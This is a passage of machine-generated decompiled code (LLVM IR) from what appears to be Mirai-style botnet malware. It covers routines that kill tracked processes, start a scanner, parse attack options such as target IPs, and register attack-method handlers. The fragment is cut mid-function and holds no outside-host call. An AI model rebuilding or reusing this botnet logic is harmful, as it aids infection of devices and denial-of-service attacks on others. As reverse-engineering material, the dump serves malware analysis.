  %v3_a300 = load i32, i32* @global_var_24324.72, align 4
  store i32 %v3_a300, i32* %r0.global-to-local, align 4
  %v2_a304 = icmp eq i32 %v3_a300, 0
  store i32 %v0_a308, i32* @global_var_24320.71, align 4
  br i1 %v2_a304, label %dec_label_pc_a310, label %dec_label_pc_a3a8

dec_label_pc_a310:                                ; preds = %dec_label_pc_a300, %dec_label_pc_a390
  %v0_a318 = phi i32 [ %v0_a308, %dec_label_pc_a300 ], [ %v0_a3a0, %dec_label_pc_a390 ]
  %v3_a310 = load i32, i32* @global_var_24328.73, align 4
  store i32 %v3_a310, i32* %r0.global-to-local, align 4
  %v2_a314 = icmp eq i32 %v3_a310, 0
  store i32 %v0_a318, i32* @global_var_24324.72, align 4
  br i1 %v2_a314, label %dec_label_pc_a320, label %dec_label_pc_a3c0

dec_label_pc_a320:                                ; preds = %dec_label_pc_a310, %dec_label_pc_a3a8
  %v0_a328 = phi i32 [ %v0_a318, %dec_label_pc_a310 ], [ %v0_a3b8, %dec_label_pc_a3a8 ]
  %v3_a320 = load i32, i32* @global_var_2432c.74, align 4
  store i32 %v3_a320, i32* %r0.global-to-local, align 4
  %v2_a324 = icmp eq i32 %v3_a320, 0
  store i32 %v0_a328, i32* @global_var_24328.73, align 4
  br i1 %v2_a324, label %dec_label_pc_a330, label %dec_label_pc_a3d8

dec_label_pc_a330:                                ; preds = %dec_label_pc_a320, %dec_label_pc_a3c0
  %v0_a338 = phi i32 [ %v0_a328, %dec_label_pc_a320 ], [ %v0_a3d0, %dec_label_pc_a3c0 ]
  %v3_a330 = load i32, i32* @global_var_24330.75, align 4
  store i32 %v3_a330, i32* %r0.global-to-local, align 4
  %v2_a334 = icmp eq i32 %v3_a330, 0
  store i32 %v0_a338, i32* @global_var_2432c.74, align 4
  br i1 %v2_a334, label %dec_label_pc_a340, label %dec_label_pc_a3f0

dec_label_pc_a340:                                ; preds = %dec_label_pc_a330, %dec_label_pc_a3d8
  %v0_a348 = phi i32 [ %v0_a338, %dec_label_pc_a330 ], [ %v0_a3e8, %dec_label_pc_a3d8 ]
  %v3_a340 = load i32, i32* @global_var_24334.76, align 4
  store i32 %v3_a340, i32* %r0.global-to-local, align 4
  %v2_a344 = icmp eq i32 %v3_a340, 0
  store i32 %v0_a348, i32* @global_var_24330.75, align 4
  br i1 %v2_a344, label %dec_label_pc_a350, label %dec_label_pc_a408

dec_label_pc_a350:                                ; preds = %dec_label_pc_a340, %dec_label_pc_a3f0
  %v0_a358 = phi i32 [ %v0_a348, %dec_label_pc_a340 ], [ %v0_a400, %dec_label_pc_a3f0 ]
  %v3_a350 = load i32, i32* @global_var_24338.77, align 4
  store i32 %v3_a350, i32* %r0.global-to-local, align 4
  %v2_a354 = icmp eq i32 %v3_a350, 0
  store i32 %v0_a358, i32* @global_var_24334.76, align 4
  br i1 %v2_a354, label %dec_label_pc_a360, label %dec_label_pc_a420

dec_label_pc_a360:                                ; preds = %dec_label_pc_a350, %dec_label_pc_a408, %dec_label_pc_a420
  %v0_a360 = phi i32 [ %v0_a358, %dec_label_pc_a350 ], [ %v0_a418, %dec_label_pc_a408 ], [ %v0_a360.pre, %dec_label_pc_a420 ]
  store i32 %v0_a360, i32* @global_var_24338.77, align 4
  %v0_a364 = call i32 @scanner_init()
  store i32 %v0_a364, i32* %r0.global-to-local, align 4
  store i32 %v3_a2d4, i32* @r4, align 4
  store i32 %v6_a2d4, i32* @r5, align 4
  ret i32 %v0_a364

dec_label_pc_a374:                                ; preds = %entry
  %v2_a378 = call i32 @kill(i32 %v2_a2dc, i32 9)
  %v3_a37c = load i32, i32* @global_var_24320.71, align 4
  store i32 %v3_a37c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v2_a384 = icmp eq i32 %v3_a37c, 0
  %v1_a388 = load i32, i32* @r4, align 4
  %v2_a388 = inttoptr i32 %v1_a388 to i32*
  store i32 0, i32* %v2_a388, align 4
  br i1 %v2_a384, label %dec_label_pc_a374.dec_label_pc_a300_crit_edge, label %dec_label_pc_a374.dec_label_pc_a390_crit_edge

dec_label_pc_a374.dec_label_pc_a300_crit_edge:    ; preds = %dec_label_pc_a374
  %v0_a308.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a300

dec_label_pc_a374.dec_label_pc_a390_crit_edge:    ; preds = %dec_label_pc_a374
  %v0_a394.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a390

dec_label_pc_a390:                                ; preds = %dec_label_pc_a374.dec_label_pc_a390_crit_edge, %dec_label_pc_a2ec
  %v0_a394 = phi i32 [ %v0_a394.pre, %dec_label_pc_a374.dec_label_pc_a390_crit_edge ], [ %v3_a2ec, %dec_label_pc_a2ec ]
  %v2_a394 = call i32 @kill(i32 %v0_a394, i32 9)
  %v3_a398 = load i32, i32* @global_var_24324.72, align 4
  store i32 %v3_a398, i32* %r0.global-to-local, align 4
  %v2_a39c = icmp eq i32 %v3_a398, 0
  %v0_a3a0 = load i32, i32* @r5, align 4
  store i32 %v0_a3a0, i32* @global_var_24320.71, align 4
  br i1 %v2_a39c, label %dec_label_pc_a310, label %dec_label_pc_a3a8

dec_label_pc_a3a8:                                ; preds = %dec_label_pc_a300, %dec_label_pc_a390
  %v0_a3ac = phi i32 [ %v3_a300, %dec_label_pc_a300 ], [ %v3_a398, %dec_label_pc_a390 ]
  %v2_a3ac = call i32 @kill(i32 %v0_a3ac, i32 9)
  %v3_a3b0 = load i32, i32* @global_var_24328.73, align 4
  store i32 %v3_a3b0, i32* %r0.global-to-local, align 4
  %v2_a3b4 = icmp eq i32 %v3_a3b0, 0
  %v0_a3b8 = load i32, i32* @r5, align 4
  store i32 %v0_a3b8, i32* @global_var_24324.72, align 4
  br i1 %v2_a3b4, label %dec_label_pc_a320, label %dec_label_pc_a3c0

dec_label_pc_a3c0:                                ; preds = %dec_label_pc_a310, %dec_label_pc_a3a8
  %v0_a3c4 = phi i32 [ %v3_a310, %dec_label_pc_a310 ], [ %v3_a3b0, %dec_label_pc_a3a8 ]
  %v2_a3c4 = call i32 @kill(i32 %v0_a3c4, i32 9)
  %v3_a3c8 = load i32, i32* @global_var_2432c.74, align 4
  store i32 %v3_a3c8, i32* %r0.global-to-local, align 4
  %v2_a3cc = icmp eq i32 %v3_a3c8, 0
  %v0_a3d0 = load i32, i32* @r5, align 4
  store i32 %v0_a3d0, i32* @global_var_24328.73, align 4
  br i1 %v2_a3cc, label %dec_label_pc_a330, label %dec_label_pc_a3d8

dec_label_pc_a3d8:                                ; preds = %dec_label_pc_a320, %dec_label_pc_a3c0
  %v0_a3dc = phi i32 [ %v3_a320, %dec_label_pc_a320 ], [ %v3_a3c8, %dec_label_pc_a3c0 ]
  %v2_a3dc = call i32 @kill(i32 %v0_a3dc, i32 9)
  %v3_a3e0 = load i32, i32* @global_var_24330.75, align 4
  store i32 %v3_a3e0, i32* %r0.global-to-local, align 4
  %v2_a3e4 = icmp eq i32 %v3_a3e0, 0
  %v0_a3e8 = load i32, i32* @r5, align 4
  store i32 %v0_a3e8, i32* @global_var_2432c.74, align 4
  br i1 %v2_a3e4, label %dec_label_pc_a340, label %dec_label_pc_a3f0

dec_label_pc_a3f0:                                ; preds = %dec_label_pc_a330, %dec_label_pc_a3d8
  %v0_a3f4 = phi i32 [ %v3_a330, %dec_label_pc_a330 ], [ %v3_a3e0, %dec_label_pc_a3d8 ]
  %v2_a3f4 = call i32 @kill(i32 %v0_a3f4, i32 9)
  %v3_a3f8 = load i32, i32* @global_var_24334.76, align 4
  store i32 %v3_a3f8, i32* %r0.global-to-local, align 4
  %v2_a3fc = icmp eq i32 %v3_a3f8, 0
  %v0_a400 = load i32, i32* @r5, align 4
  store i32 %v0_a400, i32* @global_var_24330.75, align 4
  br i1 %v2_a3fc, label %dec_label_pc_a350, label %dec_label_pc_a408

dec_label_pc_a408:                                ; preds = %dec_label_pc_a340, %dec_label_pc_a3f0
  %v0_a40c = phi i32 [ %v3_a340, %dec_label_pc_a340 ], [ %v3_a3f8, %dec_label_pc_a3f0 ]
  %v2_a40c = call i32 @kill(i32 %v0_a40c, i32 9)
  %v3_a410 = load i32, i32* @global_var_24338.77, align 4
  store i32 %v3_a410, i32* %r0.global-to-local, align 4
  %v2_a414 = icmp eq i32 %v3_a410, 0
  %v0_a418 = load i32, i32* @r5, align 4
  store i32 %v0_a418, i32* @global_var_24334.76, align 4
  br i1 %v2_a414, label %dec_label_pc_a360, label %dec_label_pc_a420

dec_label_pc_a420:                                ; preds = %dec_label_pc_a350, %dec_label_pc_a408
  %v0_a424 = phi i32 [ %v3_a350, %dec_label_pc_a350 ], [ %v3_a410, %dec_label_pc_a408 ]
  %v2_a424 = call i32 @kill(i32 %v0_a424, i32 9)
  store i32 %v2_a424, i32* %r0.global-to-local, align 4
  %v0_a360.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a360

; uselistorder directives
  uselistorder i32 %v0_a418, { 1, 0 }
  uselistorder i32 %v0_a400, { 1, 0 }
  uselistorder i32 %v0_a3e8, { 1, 0 }
  uselistorder i32 %v0_a3d0, { 1, 0 }
  uselistorder i32 %v0_a3b8, { 1, 0 }
  uselistorder i32 %v0_a3a0, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 17, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_a420, { 1, 0 }
  uselistorder label %dec_label_pc_a408, { 1, 0 }
  uselistorder label %dec_label_pc_a3f0, { 1, 0 }
  uselistorder label %dec_label_pc_a3d8, { 1, 0 }
  uselistorder label %dec_label_pc_a3c0, { 1, 0 }
  uselistorder label %dec_label_pc_a3a8, { 1, 0 }
  uselistorder label %dec_label_pc_a360, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a350, { 1, 0 }
  uselistorder label %dec_label_pc_a340, { 1, 0 }
  uselistorder label %dec_label_pc_a330, { 1, 0 }
  uselistorder label %dec_label_pc_a320, { 1, 0 }
  uselistorder label %dec_label_pc_a310, { 1, 0 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_a430 = icmp eq i32 %arg1, 0
  %v3_a434 = load i32, i32* @r4, align 4
  store i32 %v3_a434, i32* %stack_var_-8, align 4
  %v6_a434 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_a430, label %dec_label_pc_a478, label %dec_label_pc_a440

dec_label_pc_a440:                                ; preds = %entry
  %v0_a440 = load i32, i32* %r1.global-to-local, align 4
  %v1_a440 = add i32 %v0_a440, 4
  %v2_a440 = inttoptr i32 %v1_a440 to i8*
  %v3_a440 = load i8, i8* %v2_a440, align 1
  %v4_a440 = zext i8 %v3_a440 to i32
  %v9_a444 = icmp eq i32 %v4_a440, %arg3
  br i1 %v9_a444, label %dec_label_pc_a484, label %dec_label_pc_a468.preheader

dec_label_pc_a468.preheader:                      ; preds = %dec_label_pc_a440
  br label %dec_label_pc_a468

dec_label_pc_a458:                                ; preds = %dec_label_pc_a468
  %v1_a458 = add i32 %v0_a460.in, 12
  %v2_a458 = inttoptr i32 %v1_a458 to i8*
  %v3_a458 = load i8, i8* %v2_a458, align 1
  %v4_a458 = zext i8 %v3_a458 to i32
  %v9_a45c = icmp eq i32 %v4_a458, %arg3
  br i1 %v9_a45c, label %dec_label_pc_a484, label %dec_label_pc_a468

dec_label_pc_a468:                                ; preds = %dec_label_pc_a468.preheader, %dec_label_pc_a458
  %v0_a460.in = phi i32 [ %v0_a440, %dec_label_pc_a468.preheader ], [ %v0_a460, %dec_label_pc_a458 ]
  %v0_a468 = phi i32 [ 0, %dec_label_pc_a468.preheader ], [ %v1_a468, %dec_label_pc_a458 ]
  %v0_a460 = add i32 %v0_a460.in, 8
  %v1_a468 = add i32 %v0_a468, 1
  %v9_a46c = icmp eq i32 %v1_a468, %arg1
  store i32 %v0_a460, i32* %r1.global-to-local, align 4
  br i1 %v9_a46c, label %dec_label_pc_a478, label %dec_label_pc_a458

dec_label_pc_a478:                                ; preds = %dec_label_pc_a468, %dec_label_pc_a484, %entry, %dec_label_pc_a490
  %v2_a47c = phi i32 [ %v3_a434, %dec_label_pc_a484 ], [ %v3_a434, %entry ], [ %v2_a47c.pre, %dec_label_pc_a490 ], [ %v3_a434, %dec_label_pc_a468 ]
  %v0_a478 = phi i32 [ %arg4, %dec_label_pc_a484 ], [ %arg4, %entry ], [ %v1_a490, %dec_label_pc_a490 ], [ %arg4, %dec_label_pc_a468 ]
  store i32 %v2_a47c, i32* @r4, align 4
  store i32 %v6_a434, i32* @lr, align 4
  ret i32 %v0_a478

dec_label_pc_a484:                                ; preds = %dec_label_pc_a458, %dec_label_pc_a440
  %v0_a484 = phi i32 [ %v0_a440, %dec_label_pc_a440 ], [ %v0_a460, %dec_label_pc_a458 ]
  %v1_a484 = inttoptr i32 %v0_a484 to i32*
  %v2_a484 = load i32, i32* %v1_a484, align 4
  store i32 %v2_a484, i32* @r0, align 4
  %v2_a488 = icmp eq i32 %v2_a484, 0
  br i1 %v2_a488, label %dec_label_pc_a478, label %dec_label_pc_a490

dec_label_pc_a490:                                ; preds = %dec_label_pc_a484
  %v1_a490 = call i32 @inet_addr(i32 %v2_a484)
  %v2_a47c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a478

; uselistorder directives
  uselistorder i32 %v1_a468, { 1, 0 }
  uselistorder i32 %v0_a460, { 1, 0, 2 }
  uselistorder i32 %v0_a460.in, { 1, 0 }
  uselistorder i32 %v0_a440, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a478, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a468, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_a49c = icmp eq i32 %arg1, 0
  %v3_a4a0 = load i32, i32* @r4, align 4
  store i32 %v3_a4a0, i32* %stack_var_-8, align 4
  %v6_a4a0 = load i32, i32* @lr, align 4
  br i1 %v2_a49c, label %dec_label_pc_a4e4, label %dec_label_pc_a4ac

dec_label_pc_a4ac:                                ; preds = %entry
  %v0_a4ac = load i32, i32* %r1.global-to-local, align 4
  %v1_a4ac = add i32 %v0_a4ac, 4
  %v2_a4ac = inttoptr i32 %v1_a4ac to i8*
  %v3_a4ac = load i8, i8* %v2_a4ac, align 1
  %v4_a4ac = zext i8 %v3_a4ac to i32
  %v9_a4b0 = icmp eq i32 %v4_a4ac, %arg3
  br i1 %v9_a4b0, label %dec_label_pc_a4f0, label %dec_label_pc_a4d4.preheader

dec_label_pc_a4d4.preheader:                      ; preds = %dec_label_pc_a4ac
  br label %dec_label_pc_a4d4

dec_label_pc_a4c4:                                ; preds = %dec_label_pc_a4d4
  %v1_a4c4 = add i32 %v0_a4cc.in, 12
  %v2_a4c4 = inttoptr i32 %v1_a4c4 to i8*
  %v3_a4c4 = load i8, i8* %v2_a4c4, align 1
  %v4_a4c4 = zext i8 %v3_a4c4 to i32
  %v9_a4c8 = icmp eq i32 %v4_a4c4, %arg3
  br i1 %v9_a4c8, label %dec_label_pc_a4f0, label %dec_label_pc_a4d4

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a4d4.preheader, %dec_label_pc_a4c4
  %v0_a4cc.in = phi i32 [ %v0_a4ac, %dec_label_pc_a4d4.preheader ], [ %v0_a4cc, %dec_label_pc_a4c4 ]
  %v0_a4d4 = phi i32 [ 0, %dec_label_pc_a4d4.preheader ], [ %v1_a4d4, %dec_label_pc_a4c4 ]
  %v0_a4cc = add i32 %v0_a4cc.in, 8
  %v1_a4d4 = add i32 %v0_a4d4, 1
  %v9_a4d8 = icmp eq i32 %v1_a4d4, %arg1
  store i32 %v0_a4cc, i32* %r1.global-to-local, align 4
  br i1 %v9_a4d8, label %dec_label_pc_a4e4, label %dec_label_pc_a4c4

dec_label_pc_a4e4:                                ; preds = %dec_label_pc_a4d4, %dec_label_pc_a4f0, %entry, %dec_label_pc_a4fc
  %v2_a4e8 = phi i32 [ %v3_a4a0, %dec_label_pc_a4f0 ], [ %v3_a4a0, %entry ], [ %v2_a4e8.pre, %dec_label_pc_a4fc ], [ %v3_a4a0, %dec_label_pc_a4d4 ]
  %v0_a4e4 = phi i32 [ %arg4, %dec_label_pc_a4f0 ], [ %arg4, %entry ], [ %v3_a500, %dec_label_pc_a4fc ], [ %arg4, %dec_label_pc_a4d4 ]
  store i32 %v2_a4e8, i32* @r4, align 4
  store i32 %v6_a4a0, i32* @lr, align 4
  ret i32 %v0_a4e4

dec_label_pc_a4f0:                                ; preds = %dec_label_pc_a4c4, %dec_label_pc_a4ac
  %v0_a4f0 = phi i32 [ %v0_a4ac, %dec_label_pc_a4ac ], [ %v0_a4cc, %dec_label_pc_a4c4 ]
  %v1_a4f0 = inttoptr i32 %v0_a4f0 to i32*
  %v2_a4f0 = load i32, i32* %v1_a4f0, align 4
  %v2_a4f4 = icmp eq i32 %v2_a4f0, 0
  br i1 %v2_a4f4, label %dec_label_pc_a4e4, label %dec_label_pc_a4fc

dec_label_pc_a4fc:                                ; preds = %dec_label_pc_a4f0
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_a500 = inttoptr i32 %v2_a4f0 to i8*
  %v3_a500 = call i32 @util_atoi(i8* %v2_a500, i32 10)
  %v2_a4e8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a4e4

; uselistorder directives
  uselistorder i32 %v1_a4d4, { 1, 0 }
  uselistorder i32 %v0_a4cc, { 1, 0, 2 }
  uselistorder i32 %v0_a4cc.in, { 1, 0 }
  uselistorder i32 %v0_a4ac, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_a4e4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a4d4, { 1, 0 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v3_a50c = load i32, i32* @r4, align 4
  %v6_a50c = load i32, i32* @r5, align 4
  %v9_a50c = load i32, i32* @r6, align 4
  %v12_a50c = load i32, i32* @r7, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a51c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_24314.64 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24318.66 to i32), i32* @r6, align 4
  store i32 52472, i32* %r2.global-to-local, align 4
  store i32 %v2_a51c, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_24315.81 to i32), i32* %r1.global-to-local, align 4
  %v2_a53c = load i32, i32* @global_var_24318.66, align 4
  %v2_a540 = inttoptr i32 %v2_a51c to i32*
  store i32 52472, i32* %v2_a540, align 4
  %v3_a544 = load i32, i32* @r4, align 4
  %v4_a544 = add i32 %v3_a544, 4
  %v5_a544 = inttoptr i32 %v4_a544 to i8*
  store i8 0, i8* %v5_a544, align 1
  %v0_a548 = load i32, i32* %r1.global-to-local, align 4
  %v3_a548 = mul i32 %v0_a548, 4
  store i32 %v3_a548, i32* %r1.global-to-local, align 4
  %v5_a54c = inttoptr i32 %v2_a53c to i32*
  %v6_a54c = call i32 @realloc(i32* %v5_a54c, i32 %v3_a548, i32 52472, i32 0)
  %v2_a550 = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a550 = zext i8 %v2_a550 to i32
  store i32 %v6_a54c, i32* %r2.global-to-local, align 4
  %v0_a558 = load i32, i32* @r4, align 4
  %v5_a558 = mul nuw nsw i32 %v3_a550, 4
  %v6_a558 = add i32 %v5_a558, %v6_a54c
  %v7_a558 = inttoptr i32 %v6_a558 to i32*
  store i32 %v0_a558, i32* %v7_a558, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_24315.81 to i32), i32* %r3.global-to-local, align 4
  %v1_a568 = load i32, i32* @r6, align 4
  %v2_a568 = inttoptr i32 %v1_a568 to i32*
  store i32 %v6_a54c, i32* %v2_a568, align 4
  %v0_a56c = load i32, i32* %r3.global-to-local, align 4
  %v1_a56c = trunc i32 %v0_a56c to i8
  %v2_a56c = load i32, i32* @r5, align 4
  %v3_a56c = inttoptr i32 %v2_a56c to i8*
  store i8 %v1_a56c, i8* %v3_a56c, align 1
  %v2_a570 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_d1e4.83 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  store i32 %v2_a570, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_24315.81 to i32), i32* %r1.global-to-local, align 4
  %v2_a588 = load i32, i32* @global_var_24318.66, align 4
  %v2_a58c = inttoptr i32 %v2_a570 to i32*
  store i32 ptrtoint (i32* @global_var_d1e4.83 to i32), i32* %v2_a58c, align 4
  %v0_a590 = load i32, i32* @r7, align 4
  %v1_a590 = trunc i32 %v0_a590 to i8
  %v2_a590 = load i32, i32* @r4, align 4
  %v3_a590 = add i32 %v2_a590, 4
  %v4_a590 = inttoptr i32 %v3_a590 to i8*
  store i8 %v1_a590, i8* %v4_a590, align 1
  %v0_a594 = load i32, i32* %r1.global-to-local, align 4
  %v3_a594 = mul i32 %v0_a594, 4
  store i32 %v3_a594, i32* %r1.global-to-local, align 4
  %v4_a598 = inttoptr i32 %v2_a588 to i32*
  %v5_a598 = call i32 @realloc(i32* %v4_a598, i32 %v3_a594, i32 %v6_a54c, i32 ptrtoint (i32* @global_var_d1e4.83 to i32))
  %v2_a59c = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a59c = zext i8 %v2_a59c to i32
  store i32 %v3_a59c, i32* %r3.global-to-local, align 4
  store i32 %v5_a598, i32* %r2.global-to-local, align 4
  %v0_a5a4 = load i32, i32* @r4, align 4
  %v5_a5a4 = mul nuw nsw i32 %v3_a59c, 4
  %v6_a5a4 = add i32 %v5_a5a4, %v5_a598
  %v7_a5a4 = inttoptr i32 %v6_a5a4 to i32*
  store i32 %v0_a5a4, i32* %v7_a5a4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a5ac = load i32, i32* %r3.global-to-local, align 4
  %v1_a5ac = load i32, i32* @r7, align 4
  %v2_a5ac = add i32 %v1_a5ac, %v0_a5ac
  store i32 %v2_a5ac, i32* %r3.global-to-local, align 4
  %v1_a5b4 = trunc i32 %v2_a5ac to i8
  %v2_a5b4 = load i32, i32* @r5, align 4
  %v3_a5b4 = inttoptr i32 %v2_a5b4 to i8*
  store i8 %v1_a5b4, i8* %v3_a5b4, align 1
  %v0_a5b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a5b8 = load i32, i32* @r6, align 4
  %v2_a5b8 = inttoptr i32 %v1_a5b8 to i32*
  store i32 %v0_a5b8, i32* %v2_a5b8, align 4
  %v2_a5bc = call i32 @calloc(i32 %v1_a5ac, i32 8)
  %v2_a5c0 = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a5c0 = zext i8 %v2_a5c0 to i32
  store i32 ptrtoint (i32* @global_var_d61c.85 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a5bc, i32* @r4, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_a5d0 = load i32, i32* @r7, align 4
  %v2_a5d0 = add i32 %v1_a5d0, %v3_a5c0
  store i32 %v2_a5d0, i32* %r1.global-to-local, align 4
  %v2_a5d4 = load i32, i32* @global_var_24318.66, align 4
  %v2_a5d8 = inttoptr i32 %v2_a5bc to i32*
  store i32 ptrtoint (i32* @global_var_d61c.85 to i32), i32* %v2_a5d8, align 4
  %v3_a5dc = load i32, i32* @r4, align 4
  %v4_a5dc = add i32 %v3_a5dc, 4
  %v5_a5dc = inttoptr i32 %v4_a5dc to i8*
  store i8 2, i8* %v5_a5dc, align 1
  %v0_a5e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a5e0 = mul i32 %v0_a5e0, 4
  store i32 %v3_a5e0, i32* %r1.global-to-local, align 4
  %v5_a5e4 = inttoptr i32 %v2_a5d4 to i32*
  %v6_a5e4 = call i32 @realloc(i32* %v5_a5e4, i32 %v3_a5e0, i32 ptrtoint (i32* @global_var_d61c.85 to i32), i32 2)
  %v2_a5e8 = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a5e8 = zext i8 %v2_a5e8 to i32
  store i32 %v3_a5e8, i32* %r3.global-to-local, align 4
  store i32 %v6_a5e4, i32* %r2.global-to-local, align 4
  %v0_a5f0 = load i32, i32* @r4, align 4
  %v5_a5f0 = mul nuw nsw i32 %v3_a5e8, 4
  %v6_a5f0 = add i32 %v5_a5f0, %v6_a5e4
  %v7_a5f0 = inttoptr i32 %v6_a5f0 to i32*
  store i32 %v0_a5f0, i32* %v7_a5f0, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a5f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5f8 = load i32, i32* @r7, align 4
  %v2_a5f8 = add i32 %v1_a5f8, %v0_a5f8
  store i32 %v2_a5f8, i32* %r3.global-to-local, align 4
  %v1_a600 = trunc i32 %v2_a5f8 to i8
  %v2_a600 = load i32, i32* @r5, align 4
  %v3_a600 = inttoptr i32 %v2_a600 to i8*
  store i8 %v1_a600, i8* %v3_a600, align 1
  %v0_a604 = load i32, i32* %r2.global-to-local, align 4
  %v1_a604 = load i32, i32* @r6, align 4
  %v2_a604 = inttoptr i32 %v1_a604 to i32*
  store i32 %v0_a604, i32* %v2_a604, align 4
  %v2_a608 = call i32 @calloc(i32 %v1_a5f8, i32 8)
  %v2_a60c = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a60c = zext i8 %v2_a60c to i32
  store i32 ptrtoint (i32* @global_var_ca58.87 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a608, i32* @r4, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_a61c = load i32, i32* @r7, align 4
  %v2_a61c = add i32 %v1_a61c, %v3_a60c
  store i32 %v2_a61c, i32* %r1.global-to-local, align 4
  %v2_a620 = load i32, i32* @global_var_24318.66, align 4
  %v2_a624 = inttoptr i32 %v2_a608 to i32*
  store i32 ptrtoint (i32* @global_var_ca58.87 to i32), i32* %v2_a624, align 4
  %v3_a628 = load i32, i32* @r4, align 4
  %v4_a628 = add i32 %v3_a628, 4
  %v5_a628 = inttoptr i32 %v4_a628 to i8*
  store i8 9, i8* %v5_a628, align 1
  %v0_a62c = load i32, i32* %r1.global-to-local, align 4
  %v3_a62c = mul i32 %v0_a62c, 4
  store i32 %v3_a62c, i32* %r1.global-to-local, align 4
  %v5_a630 = inttoptr i32 %v2_a620 to i32*
  %v6_a630 = call i32 @realloc(i32* %v5_a630, i32 %v3_a62c, i32 ptrtoint (i32* @global_var_ca58.87 to i32), i32 9)
  %v2_a634 = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a634 = zext i8 %v2_a634 to i32
  store i32 %v3_a634, i32* %r3.global-to-local, align 4
  store i32 %v6_a630, i32* %r2.global-to-local, align 4
  %v0_a63c = load i32, i32* @r4, align 4
  %v5_a63c = mul nuw nsw i32 %v3_a634, 4
  %v6_a63c = add i32 %v5_a63c, %v6_a630
  %v7_a63c = inttoptr i32 %v6_a63c to i32*
  store i32 %v0_a63c, i32* %v7_a63c, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a644 = load i32, i32* %r3.global-to-local, align 4
  %v1_a644 = load i32, i32* @r7, align 4
  %v2_a644 = add i32 %v1_a644, %v0_a644
  store i32 %v2_a644, i32* %r3.global-to-local, align 4
  %v1_a64c = trunc i32 %v2_a644 to i8
  %v2_a64c = load i32, i32* @r5, align 4
  %v3_a64c = inttoptr i32 %v2_a64c to i8*
  store i8 %v1_a64c, i8* %v3_a64c, align 1
  %v0_a650 = load i32, i32* %r2.global-to-local, align 4
  %v1_a650 = load i32, i32* @r6, align 4
  %v2_a650 = inttoptr i32 %v1_a650 to i32*
  store i32 %v0_a650, i32* %v2_a650, align 4
  %v2_a654 = call i32 @calloc(i32 %v1_a644, i32 8)
  %v2_a658 = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a658 = zext i8 %v2_a658 to i32
  store i32 ptrtoint (i32* @global_var_c3ac.89 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a654, i32* @r4, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_a668 = load i32, i32* @r7, align 4
  %v2_a668 = add i32 %v1_a668, %v3_a658
  store i32 %v2_a668, i32* %r1.global-to-local, align 4
  %v2_a66c = load i32, i32* @global_var_24318.66, align 4
  %v2_a670 = inttoptr i32 %v2_a654 to i32*
  store i32 ptrtoint (i32* @global_var_c3ac.89 to i32), i32* %v2_a670, align 4
  %v3_a674 = load i32, i32* @r4, align 4
  %v4_a674 = add i32 %v3_a674, 4
  %v5_a674 = inttoptr i32 %v4_a674 to i8*
